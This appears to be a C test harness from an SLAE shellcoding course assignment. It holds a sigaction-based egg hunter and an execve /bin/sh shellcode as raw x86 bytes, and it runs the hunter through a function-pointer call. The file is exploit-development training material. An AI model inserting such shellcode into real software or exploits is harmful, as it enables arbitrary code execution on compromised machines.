// SLAE Assignment #3: EGG Hunter Using Sigaction Method
// Website:  http://blog.jsiob.com
// SLAE-ID: 1400



#include<stdio.h>
#include<string.h>


#define EGG "\x90\x50\x90\x50"

unsigned char egghunter[] = \
"\x66\x81\xc9\xff\x0f\x41\x6a\x43\x58\xcd\x80\x3c\xf2\x74\xf1\xb8"
EGG
"\x89\xcf\xaf\x75\xec\xaf\x75\xe9\xff\xe7";

// Execve Shell
unsigned char code[] = \
EGG EGG
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

main()
{
	
	printf("Egghunter Length:  %d\n", strlen(egghunter));
	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())egghunter;

	ret();

}
